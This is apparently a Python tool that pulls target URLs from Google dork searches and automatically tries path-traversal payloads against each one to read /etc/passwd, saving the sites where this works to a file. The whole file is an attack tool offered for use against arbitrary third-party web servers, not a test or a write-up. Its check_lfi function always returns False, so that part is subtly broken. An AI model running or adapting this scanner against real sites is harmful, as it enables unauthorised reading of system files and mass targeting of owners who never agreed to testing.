# github.com/sandiskyy
import requests
from bs4 import BeautifulSoup
from urllib.parse import unquote
from colorama import Fore, Style
import time
import lib.fox
import urllib

class LFIScanner:
    def __init__(self):
        self.lfi_payloads = [
            "../../../../../../../../../../../etc/passwd",
            "../../../../../../../../../../../etc/passwd",
            "/..././..././..././..././..././..././..././etc/passwd%00",
            "../../../../../../../..//etc/passwd"
        ]

    def google_lfi(self, num_results: int):
        search_engine = "https://www.google.com/search"
        with open("db/dork.txt", "r") as f:
            dorks = f.readlines()
        for dork in dorks:
            dork = dork.strip()
            url = f"{search_engine}?q={dork}&num={num_results}"
            try:
                response = requests.get(url, timeout=5)
            except requests.exceptions.RequestException as e:
                print(Fore.RED + Style.BRIGHT + "[!] Request exception: %s" % e)
                continue
            soup = BeautifulSoup(response.text, "html.parser")
            results = soup.find_all("a")
            urls = []
            for result in results:
                href = result.get("href")
                if href.startswith("/url?q="):
                    url = href[7:].split("&")[0]
                    url = unquote(url)
                    urls.append(url)
            for url in urls:
                for payload in self.lfi_payloads:
                    target_url = f"{url}{payload}"
                    try:
                        response = requests.get(target_url, timeout=5)
                        if "root:x:" in response.text:
                            print(
                                Fore.RED + Style.BRIGHT + "[+]" + Fore.GREEN + Style.BRIGHT + "LFI vulnerability found at " + Fore.RED
                                + Style.BRIGHT + f"{target_url}" + Style.RESET_ALL)
                            with open("FoxVuln.txt", "a") as f:
                                f.write(f"{target_url}\n")
                                print(Fore.MAGENTA + "Vulnerability Urls saved in FoxVuln.txt file")
                        else:
                            print(
                                Fore.BLUE + "[-] " + Fore.GREEN + f"{target_url}" + Fore.YELLOW + " is not vulnerable to LFI")
                    except requests.exceptions.RequestException as e:
                        print(Fore.RED + "[!] Request exception: %s" % e)
                        continue

    def check_lfi(self, url):
        for payload in self.lfi_payloads:
            try:
                r = requests.get(url + payload, timeout=5)
                if "root:x" in r.text:
                    print(Fore.RED + "[+] " + Fore.GREEN + f"LFI vulnerability found at {url}{payload}")
                else:
                    print(Fore.BLUE + "[-]" + Fore.GREEN + f"LFI is not found at {url}{payload}")
            except requests.exceptions.RequestException as e:
                print(Fore.RED + "[!] Request exception: %s" % e)
        return False

    def run(self):
        while True:
            a = input(Fore.WHITE + "1.Scan Wit Dork \n" + Fore.BLUE + "2."

                      "Target Url \n" + Fore.MAGENTA + "0.Quit\n" + Fore.CYAN + Style.BRIGHT+ "Fox : ")
            if a == "1":
                take_number = input("\nEnter "
                                    "The "
                                    "Number "
                                    "Of "
                                    "Search "
                                    "Results: ")
                self.google_lfi(take_number)
                print(Fore.GREEN + "Search finished.")
            elif a == "2":
                try:
                    url_list_path = input(Fore.CYAN + "Wordlist Url : ")
                    with open(url_list_path, 'r') as f:
                        urls = f.readlines()
                    for url in urls:
                        url = url.strip()
                        if self.check_lfi(url):
                            print(Fore.GREEN + f"LFI vulnerability found at {url}")
                        else:
                            print(Fore.BLUE + f"LFI is not found at {url}")
                    print(Fore.GREEN + "Search finished.")
                except Exception as e:
                    print(Fore.RED + f"Error: {e}")
                    continue
            elif a == "0":
                print(Fore.CYAN + "Quitting...")
                break
            else:
                print(Fore.RED + "Please Choose 1 or 2 !?")
                input(Fore.YELLOW + "Press enter to continue...")

if __name__ == "__main__":
    scanner = LFIScanner()
    scanner.run()
